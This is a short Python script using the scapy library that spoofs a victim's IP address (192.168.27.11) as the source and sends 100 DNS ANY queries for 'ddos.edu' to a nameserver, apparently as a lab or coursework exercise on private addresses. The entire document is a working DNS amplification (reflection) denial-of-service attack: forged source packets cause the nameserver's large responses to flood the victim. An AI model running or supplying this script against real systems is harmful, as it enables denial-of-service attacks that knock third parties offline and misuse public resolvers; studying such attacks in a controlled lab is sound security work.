#!/usr/bin/env python3

from scapy.all import *

target = '192.168.27.11'
nameserver = '192.168.27.9'
domain = 'ddos.edu'

ip = IP(src=target, dst=nameserver)
udp = UDP(dport=53)
dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=domain, qtype=255))

request = (ip/udp/dns)
send(request, count=100)
